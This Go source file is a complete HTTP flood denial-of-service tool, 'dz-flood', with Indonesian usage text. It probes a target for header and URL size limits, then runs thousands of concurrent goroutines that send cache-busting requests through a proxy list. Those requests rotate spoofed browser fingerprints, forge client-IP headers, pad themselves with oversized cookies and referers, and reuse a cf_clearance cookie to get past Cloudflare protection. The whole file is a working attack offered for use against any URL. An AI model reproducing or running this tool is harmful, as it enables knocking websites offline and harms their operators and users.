package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	wrk        = 1500
	to         = 5 * time.Second
	sub        = 5
	KEEP_ALIVE = 30 * time.Second
)

type BrowserProfile struct {
	UA          string
	Accept      string
	Lang        string
	Encoding    string
	SecChUa     string
	SecChUaMov  string
	SecChUaPlat string
}

var profiles = []BrowserProfile{
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "macOS",
	},
	{
		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?1",
		SecChUaPlat: "Android",
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
	{
		UA:          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
var REF = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://www.yahoo.com/search?p=",
	"https://www.duckduckgo.com/?q=",
}

type CLI struct {
	client *http.Client
	ip     string
}

type Capabilities struct {
	Headers map[string]bool
	Range   bool
	IfRange bool
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func RIP(rng *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
}

func RST(rng *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

var customCookie string
var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)

func Detect_Pyload(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{64, 128, 256, 512, 1024}
	lastSuccess := 0
	for _, size := range sizes {
		testURL := target
		if strings.Contains(testURL, "?") {
			testURL += "&big=" + strings.Repeat("x", size)
		} else {
			testURL += "?big=" + strings.Repeat("x", size)
		}
		req, _ := http.NewRequest("GET", testURL, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			lastSuccess = size
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
			break
		} else {
			break
		}
	}
	return lastSuccess
}

func Detect_Header_Support(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{512, 1024}
	lastSuccess := 0
	for _, size := range sizes {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Large-Data", strings.Repeat("x", size))
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			lastSuccess = size
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
			break
		} else {
			break
		}
	}
	return lastSuccess
}

func Detect_Headers_Costum(target string, proxyIP string) Capabilities {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	parsedTarget, _ := url.Parse(target)
	targetHost := parsedTarget.Hostname()
	if proxyIP == "" {
		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
		proxyIP = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	}

	headerList := []string{
		"X-Original-URL", "X-Forwarded-Host", "X-Request-ID", "CDN-Loop",
		"CF-Connecting-IP", "True-Client-IP", "X-Client-IP", "X-Remote-IP",
		"X-Originating-IP", "X-Forwarded-Proto", "X-Forwarded-Port",
		"X-Forwarded-Scheme", "X-Requested-With", "Accept-Charset",
		"Accept-Datetime", "From", "Max-Forwards", "Via", "Warning",
		"DNT", "Upgrade", "Save-Data", "X-HTTP-Method-Override", "X-Cache",
	}
	result := make(map[string]bool)
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))

	for _, h := range headerList {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		switch h {
		case "X-Original-URL":
			req.Header.Set("X-Original-URL", "/"+RST(rng, 8))
		case "X-Forwarded-Host":
			req.Header.Set("X-Forwarded-Host", targetHost)
		case "X-Request-ID":
			req.Header.Set("X-Request-ID", strconv.FormatInt(rng.Int63(), 16))
		case "CDN-Loop":
			req.Header.Set("CDN-Loop", "cloudflare")
		case "CF-Connecting-IP", "True-Client-IP", "X-Client-IP", "X-Remote-IP", "X-Originating-IP":
			req.Header.Set(h, proxyIP)
		case "X-Forwarded-Proto":
			req.Header.Set(h, "https")
		case "X-Forwarded-Port":
			req.Header.Set(h, "443")
		case "X-Forwarded-Scheme":
			req.Header.Set(h, "https")
		case "X-Requested-With":
			req.Header.Set(h, "XMLHttpRequest")
		case "Accept-Charset":
			req.Header.Set(h, "utf-8")
		case "Accept-Datetime":
			req.Header.Set(h, time.Now().Format(time.RFC1123))
		case "From":
			req.Header.Set(h, "t.me/ytdizflzye.com")
		case "Max-Forwards":
			req.Header.Set(h, "5")
		case "Via":
			req.Header.Set(h, "1.1 proxy")
		case "Warning":
			req.Header.Set(h, "199 - \"misc\"")
		case "DNT":
			req.Header.Set(h, "1")
		case "Upgrade":
			req.Header.Set(h, "websocket")
		case "Save-Data":
			req.Header.Set(h, "on")
		case "X-HTTP-Method-Override":
			req.Header.Set(h, "PUT")
		case "X-Cache":
			req.Header.Set(h, "MISS")
		}
		resp, err := client.Do(req)
		if err != nil {
			result[h] = false
			continue
		}
		resp.Body.Close()
		code := resp.StatusCode
		if code >= 200 && code < 400 {
			result[h] = true
		} else if code == 400 || code == 413 || code == 431 || code == 501 {
			result[h] = false
		} else {
			result[h] = true
		}
	}

	rangeSupported := false
	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("Range", "bytes=0-0")
	resp, err := client.Do(req)
	if err == nil {
		if resp.StatusCode == http.StatusPartialContent ||
			(resp.StatusCode == http.StatusOK && resp.Header.Get("Content-Range") != "") {
			rangeSupported = true
		}
		resp.Body.Close()
	}

	ifRangeSupported := false
	if rangeSupported {
		req, _ = http.NewRequest("GET", target, nil)
		req.Header.Set("Range", "bytes=0-0")
		req.Header.Set("If-Range", `"fake-etag-`+RST(rng, 8)+`"`)
		resp, err = client.Do(req)
		if err == nil {
			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusPartialContent {
				ifRangeSupported = true
			}
			resp.Body.Close()
		}
	}

	return Capabilities{
		Headers: result,
		Range:   rangeSupported,
		IfRange: ifRangeSupported,
	}
}

func Detect_Max_Total_Header_Size(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{0, 512, 1024, 2048, 4096, 8192, 16384}
	lastSuccess := 0
	for _, size := range sizes {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Connection", "close")
		if size > 0 {
			req.Header.Set("X-Filler", strings.Repeat("x", size))
		}
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		code := resp.StatusCode
		if code >= 200 && code < 400 {
			lastSuccess = size
		} else if code == 431 || code == 400 || code == 413 {
			break
		} else {
			lastSuccess = size
		}
	}
	return lastSuccess
}

func main() {
	log.SetOutput(io.Discard)
	if len(os.Args) < 2 {
		fmt.Println("Cara pakai: dz-flood <target> [duration] [cookie]")
		fmt.Println("Contoh: dz-flood https://target.com 60 \"cf_clearance=xxx\"")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}
	if len(os.Args) >= 4 {
		customCookie = os.Args[3]
	}

	parsed, _ := url.Parse(tgt)
	host := parsed.Hostname()

	var proxies []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxies = append(proxies, p)
			}
		}
	}
	if len(proxies) == 0 {
		proxies = append(proxies, nil)
	}

	var proxyIP string
	if len(proxies) > 0 && proxies[0] != nil {
		proxyIP = proxies[0].Hostname()
	}

	maxPayload := Detect_Pyload(tgt)
	maxHeader := Detect_Header_Support(tgt)
	caps := Detect_Headers_Costum(tgt, proxyIP)
	maxTotalHeader := Detect_Max_Total_Header_Size(tgt)

	wcs := make([]CLI, len(proxies))
	for i, proxyURL := range proxies {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: KEEP_ALIVE,
			}).DialContext,
			DisableKeepAlives:      false,
			MaxIdleConns:           50000,
			MaxIdleConnsPerHost:    50000,
			MaxConnsPerHost:        0,
			IdleConnTimeout:        KEEP_ALIVE,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2", "http/1.1"},
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				},
			},
			ForceAttemptHTTP2:     true,
			DisableCompression:    false,
			TLSHandshakeTimeout:   4 * time.Second,
			ResponseHeaderTimeout: 3 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		}
		ip := ""
		if proxyURL != nil {
			tr.Proxy = http.ProxyURL(proxyURL)
			ip = proxyURL.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		client := &http.Client{
			Transport: tr,
			Timeout:   to,
			Jar:       jar,
		}
		wcs[i] = CLI{client: client, ip: ip}
	}

	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("ޗ | Author : Diz Flyze\n")
	fmt.Printf("ޗ | Target : %s\n", tgt)
	fmt.Printf("ޗ | Time   : %d/s\n", dur)
	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
	fmt.Printf("ޗ | Conc   : %d\n", wrk)
	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
	fmt.Printf("ޗ | Ulimit : 1048576\n")
	if customCookie != "" {
		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
	} else {
		fmt.Printf("ޗ | Cookie : False\n")
	}
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	for i := 0; i < wrk; i++ {
		wg.Add(1)
		c := wcs[i%len(wcs)]
		go func(cli CLI, workerID int) {
			defer wg.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			var swg sync.WaitGroup
			for s := 0; s < sub; s++ {
				swg.Add(1)
				go func(subID int) {
					defer swg.Done()
					subRng := rand.New(rand.NewSource(rng.Int63()))

					for ctx.Err() == nil {
						prof := profiles[subRng.Intn(len(profiles))]

						reqURL := tgt

						param := CBP[subRng.Intn(len(CBP))]
						if strings.Contains(reqURL, "?") {
							reqURL += "&" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
						} else {
							reqURL += "?" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
						}

						if maxPayload > 0 && subRng.Intn(3) == 0 {
							size := maxPayload/2 + subRng.Intn(maxPayload/2)
							if size < 1 {
								size = 64
							}
							reqURL += "&big=" + strings.Repeat("x", size)
						}

						if subRng.Intn(10) == 0 {
							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
						}

						req, _ := http.NewRequest("GET", reqURL, nil)

						headerMap := make(map[string]string)

						headerMap["User-Agent"] = prof.UA
						headerMap["Accept"] = prof.Accept
						headerMap["Accept-Language"] = prof.Lang
						headerMap["Accept-Encoding"] = prof.Encoding
						headerMap["Connection"] = "keep-alive"
						headerMap["Cache-Control"] = "no-cache, no-store, must-revalidate"
						headerMap["Pragma"] = "no-cache"
						headerMap["Upgrade-Insecure-Requests"] = "1"
						headerMap["If-Modified-Since"] = ifModifiedSince
						headerMap["X-Cache-Buster"] = strconv.FormatInt(subRng.Int63(), 16)

						if caps.Headers["X-Original-URL"] && subRng.Intn(3) == 0 {
							headerMap["X-Original-URL"] = "/" + strconv.FormatInt(subRng.Int63(), 16)
						}
						if caps.Headers["X-Forwarded-Host"] && subRng.Intn(3) == 0 {
							headerMap["X-Forwarded-Host"] = strconv.FormatInt(subRng.Int63(), 16) + ".example.com"
						}
						if caps.Headers["X-Request-ID"] && subRng.Intn(3) == 0 {
							headerMap["X-Request-ID"] = strconv.FormatInt(subRng.Int63(), 16)
						}
						if caps.Headers["CF-Connecting-IP"] && subRng.Intn(5) == 0 {
							headerMap["CF-Connecting-IP"] = cli.ip
						}
						if caps.Headers["True-Client-IP"] && subRng.Intn(5) == 0 {
							headerMap["True-Client-IP"] = cli.ip
						}
						if caps.Headers["CDN-Loop"] && subRng.Intn(5) == 0 {
							headerMap["CDN-Loop"] = "cloudflare"
						}

						for h, supported := range caps.Headers {
							if !supported {
								continue
							}
							if subRng.Intn(3) != 0 {
								continue
							}
							switch h {
							case "X-Original-URL", "X-Forwarded-Host", "X-Request-ID", "CDN-Loop", "CF-Connecting-IP", "True-Client-IP":
							case "X-Client-IP", "X-Remote-IP", "X-Originating-IP":
								headerMap[h] = cli.ip
							case "X-Forwarded-Proto":
								headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
							case "X-Forwarded-Port":
								headerMap[h] = strconv.Itoa(80 + subRng.Intn(100))
							case "X-Forwarded-Scheme":
								headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
							case "X-Requested-With":
								headerMap[h] = "XMLHttpRequest"
							case "Accept-Charset":
								headerMap[h] = "utf-8, iso-8859-1;q=0.5"
							case "Accept-Datetime":
								headerMap[h] = time.Now().Add(-time.Duration(subRng.Intn(3600)) * time.Second).Format(time.RFC1123)
							case "From":
								headerMap[h] = RST(subRng, 8) + "@example.com"
							case "Max-Forwards":
								headerMap[h] = strconv.Itoa(1 + subRng.Intn(10))
							case "Via":
								headerMap[h] = fmt.Sprintf("1.1 proxy-%d.example.com", subRng.Intn(100))
							case "Warning":
								headerMap[h] = fmt.Sprintf("%d %s", 100+subRng.Intn(20), RST(subRng, 10))
							case "DNT":
								headerMap[h] = "1"
							case "Upgrade":
								headerMap[h] = "websocket"
							case "Save-Data":
								headerMap[h] = "on"
							case "X-HTTP-Method-Override":
								headerMap[h] = []string{"PUT", "DELETE", "PATCH"}[subRng.Intn(3)]
							case "X-Cache":
								headerMap[h] = []string{"MISS", "HIT", "EXPIRED"}[subRng.Intn(3)]
							}
						}

						if subRng.Intn(2) == 0 {
							randHeader := "X-" + RST(subRng, 8)
							headerMap[randHeader] = RST(subRng, 16)
						}

						if subRng.Intn(4) == 0 {
							bigCookie := "big=" + strings.Repeat("x", 512+subRng.Intn(1024))
							if existing, ok := headerMap["Cookie"]; ok {
								headerMap["Cookie"] = existing + "; " + bigCookie
							} else {
								headerMap["Cookie"] = bigCookie
							}
						}

						if subRng.Intn(4) == 0 {
							ref := REF[subRng.Intn(len(REF))]
							ref += RST(subRng, 16) + "=" + strings.Repeat("x", 512+subRng.Intn(1024))
							headerMap["Referer"] = ref
						}

						if caps.Range && subRng.Intn(4) == 0 {
							start := subRng.Intn(10000)
							end := start + 1000 + subRng.Intn(5000)
							headerMap["Range"] = fmt.Sprintf("bytes=%d-%d", start, end)
							if caps.IfRange && subRng.Intn(2) == 0 {
								if subRng.Intn(2) == 0 {
									headerMap["If-Range"] = `"` + RST(subRng, 16) + `"`
								} else {
									past := time.Now().Add(-time.Duration(subRng.Intn(86400)) * time.Second).Format(time.RFC1123)
									headerMap["If-Range"] = past
								}
							}
						}

						if subRng.Intn(5) == 0 {
							headerMap["X-Real-IP"] = cli.ip
						}

						if maxHeader > 0 && subRng.Intn(2) == 0 {
							size := maxHeader/2 + subRng.Intn(maxHeader/2)
							if size < 1 {
								size = 512
							}
							headerMap["X-Large-Data"] = strings.Repeat("x", size)
						}

						var cookies []string
						if customCookie != "" {
							cookies = append(cookies, customCookie)
						}
						for _, name := range COOKIES {
							if subRng.Intn(2) == 0 {
								cookies = append(cookies, name+"="+strconv.FormatInt(subRng.Int63(), 16))
							}
						}
						if len(cookies) > 0 {
							if existing, ok := headerMap["Cookie"]; ok {
								headerMap["Cookie"] = existing + "; " + strings.Join(cookies, "; ")
							} else {
								headerMap["Cookie"] = strings.Join(cookies, "; ")
							}
						}

						if subRng.Intn(8) != 0 {
							ref := REF[subRng.Intn(len(REF))]
							headerMap["Referer"] = ref + host
						}

						if prof.SecChUa != "" {
							headerMap["Sec-Ch-Ua"] = prof.SecChUa
							headerMap["Sec-Ch-Ua-Mobile"] = prof.SecChUaMov
							headerMap["Sec-Ch-Ua-Platform"] = prof.SecChUaPlat
						}

						headerMap["Sec-Fetch-Site"] = "none"
						headerMap["Sec-Fetch-Mode"] = "navigate"
						headerMap["Sec-Fetch-Dest"] = "document"

						PID := cli.ip
						if PID == "" {
							PID = RIP(subRng)
						}
						headerMap["X-Forwarded-For"] = PID
						headerMap["X-Real-IP"] = PID

						if maxTotalHeader > 0 {
							totalSize := 0
							for k, v := range headerMap {
								totalSize += len(k) + len(v) + 4
							}
							required := map[string]bool{
								"User-Agent": true, "Accept": true, "Accept-Language": true,
								"Accept-Encoding": true, "Connection": true,
							}
							for totalSize > maxTotalHeader && len(headerMap) > 10 {
								for k := range headerMap {
									if required[k] {
										continue
									}
									totalSize -= len(k) + len(headerMap[k]) + 4
									delete(headerMap, k)
									break
								}
							}
						}

						for k, v := range headerMap {
							req.Header.Set(k, v)
						}

						resp, err := cli.client.Do(req)
						if err == nil {
							io.Copy(io.Discard, resp.Body)
							resp.Body.Close()
						}
					}
				}(s)
			}
			swg.Wait()
		}(c, i)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg.Wait()
}
